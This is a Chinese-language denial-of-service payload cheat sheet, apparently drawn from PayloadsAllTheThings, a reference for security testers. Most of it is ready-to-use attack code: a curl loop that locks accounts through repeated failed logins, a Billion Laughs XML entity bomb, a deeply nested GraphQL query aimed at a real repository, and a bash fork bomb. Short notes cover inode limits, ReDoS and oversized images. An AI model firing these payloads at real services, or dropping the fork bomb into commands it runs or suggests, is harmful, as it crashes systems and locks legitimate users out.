# Denial of Service - 拒绝服务

[SEARCH_KEYWORDS]
漏洞类型: Denial of Service DoS DDoS 拒绝服务 分布式拒绝服务
攻击类型: Service Disruption Resource Exhaustion System Crash
关键词: DoS DDoS flood resource exhaustion memory CPU bandwidth
技术: Account Locking File System Limits Memory Exhaustion Fork Bomb
Payload: Billion Laughs XML Bomb Deep Query Negative Values

[CONTENT]

## 拒绝服务概述

拒绝服务(DoS)攻击旨在通过大量非法请求或利用目标软件漏洞使其崩溃或性能下降，从而使服务不可用。分布式拒绝服务(DDoS)使用多个来源同时执行攻击。

## 攻击类型

### 账户锁定

多次登录失败导致账户临时/永久锁定：

```ps1
for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
```

**注意**：这通常超出测试范围，可能对业务产生高影响。

### 文件系统限制

尝试达到文件系统允许的最大文件数：

| 文件系统 | 最大Inodes |
|----------|------------|
| BTRFS | 2^64 (~18 quintillion) |
| EXT4 | ~4 billion |
| FAT32 | ~268 million |
| NTFS | ~4.2 billion |
| XFS | Dynamic |
| ZFS | ~281 trillion |

FAT32限制为**4 GB**，现代文件系统支持EB级文件。

### 内存耗尽

#### XML外部实体 - Billion Laughs攻击

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

#### GraphQL - 深层嵌套查询

```ps1
query {
    repository(owner:"rails", name:"rails") {
        assignableUsers (first: 100) {
            nodes {
                repositories (first: 100) {
                    nodes {

                    }
                }
            }
        }
    }
}
```

#### 其他技术

- **图像调整大小**：发送异常尺寸、大像素数的无效图片
- **SVG处理**：基于XML，可使用Billion Laughs攻击
- **正则表达式**：ReDoS攻击
- **Fork Bomb**：

```ps1
:(){ :|:& };:
```

## 参考文档

原始来源: PayloadsAllTheThings/Denial of Service/README.md